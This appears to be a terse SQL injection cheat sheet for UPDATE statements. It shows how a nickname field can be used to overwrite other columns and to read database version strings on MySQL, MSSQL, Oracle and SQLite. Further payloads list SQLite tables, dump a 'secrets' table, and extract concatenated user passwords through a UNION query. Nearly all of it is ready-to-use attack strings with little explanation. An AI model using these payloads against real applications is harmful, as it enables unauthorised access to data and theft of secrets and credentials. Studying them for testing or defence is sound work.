```UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>```
UPDATE usertable SET nickName='capybara',email='test@test.com',password='ce5ca673d13b36118d54a7cf13aeb0ca012383bf771e713421b4d1fd841f539a' WHERE UID='1'
UPDATE usertable SET nickName='',nickName='database()', email='test@test.com',password='ce5ca673d13b36118d54a7cf13aeb0ca012383bf771e713421b4d1fd841f539a' WHERE UID='1'
```
# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='
```
SQLite

```',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='```

```',nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='secrets'),email='```

```',nickName=(SELECT group_concat(id || "," || author || "," || secret || ":") from secrets),email='```

```' UNION SELECT 1,group_concat(password) FROM users-- -```



